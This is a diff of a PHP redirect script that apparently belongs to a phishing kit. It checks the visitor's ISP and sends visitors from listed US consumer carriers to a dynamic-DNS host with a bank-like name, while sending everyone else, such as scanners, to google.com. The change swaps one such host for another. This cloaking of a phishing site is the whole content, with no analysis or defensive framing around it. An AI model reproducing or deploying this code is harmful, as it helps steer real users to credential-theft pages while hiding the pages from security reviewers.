@@ -29,23 +29,23 @@ if(!empty($ipData)){
 } 
 
 if ($isp == "T-Mobile USA, Inc.") {
-	header ("Location: https://mtbvncx1.ddnss.eu");
+	header ("Location: https://afcubnkingxcm.ddnss.eu");
 }elseif ($isp == "Sprint") {
-	header ("Location: https://mtbvncx1.ddnss.eu");
+	header ("Location: https://afcubnkingxcm.ddnss.eu");
 }elseif ($isp == "Verizon Business") {
-	header ("Location: https://mtbvncx1.ddnss.eu");
+	header ("Location: https://afcubnkingxcm.ddnss.eu");
 }elseif ($isp == "Charter Communications Inc") {
-	header ("Location: https://mtbvncx1.ddnss.eu");
+	header ("Location: https://afcubnkingxcm.ddnss.eu");
 }elseif ($isp == "AT&T Worldnet Services") {
-	header ("Location: https://mtbvncx1.ddnss.eu");
+	header ("Location: https://afcubnkingxcm.ddnss.eu");
 }elseif ($isp == "AT&T Mobility LLC") {
-	header ("Location: https://mtbvncx1.ddnss.eu");
+	header ("Location: https://afcubnkingxcm.ddnss.eu");
 }elseif ($isp == "Comcast") {
-	header ("Location: https://mtbvncx1.ddnss.eu");
+	header ("Location: https://afcubnkingxcm.ddnss.eu");
 }elseif ($isp == "Wi-Fiber, Inc.") {
-	header ("Location: https://mtbvncx1.ddnss.eu");
+	header ("Location: https://afcubnkingxcm.ddnss.eu");
 }elseif ($isp == "Cox Communications Inc.") {
-	header ("Location: https://mtbvncx1.ddnss.eu");
+	header ("Location: https://afcubnkingxcm.ddnss.eu");
 } else {
   header ("Location: https://www.google.com");
 }
